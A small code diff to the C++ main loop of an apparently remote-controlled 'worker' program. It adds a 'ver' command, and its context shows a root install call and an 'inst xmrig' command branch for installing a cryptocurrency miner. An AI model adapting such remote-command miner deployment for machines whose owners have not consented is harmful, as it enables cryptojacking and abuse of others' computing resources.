@@ -20,7 +20,7 @@ int main()
         worker.install("root");
 
     std::thread status_thread(send_status, &worker);
-    
+
     std::vector<std::string> msgs;
     while (true)
     {
@@ -36,6 +36,10 @@ int main()
             else if (msgs[1] == "set msg count")
             {
                 worker.setReceiveMsgCnt(std::stoi(msgs[2]));
+            }
+            else if (msgs[1] == "ver")
+            {
+                worker.send(VERSION);
             }
             else if (msgs[1] == "inst xmrig")
             {
